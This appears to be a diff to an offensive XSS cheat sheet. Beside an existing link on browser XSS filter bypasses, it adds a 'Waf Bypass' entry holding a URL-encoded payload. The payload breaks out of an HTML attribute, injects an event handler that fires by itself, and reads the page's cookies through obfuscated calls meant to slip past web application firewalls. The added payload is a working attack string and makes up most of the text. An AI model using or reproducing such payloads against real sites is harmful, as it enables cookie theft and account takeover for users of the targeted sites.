@@ -20,6 +20,12 @@
   ```bash
   https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#angularの利用
   ```
+- **Waf Bypass**:
+  ```bash
+  '></a><input%20type=hidden%20oncontentvisibilityautostatechange="function%20bola(value)%20%7BReflect.apply(window.alert,%20null,%20[value]);%7D;with%20(document)%20%7BfinalCook=cookie;%7D;bola(finalCook)";%20style=content-visibility:auto><a%20'
+  ```
+
+
 
 #### **2. XSS Techniques**
 - **Bypass Cookies blocked**
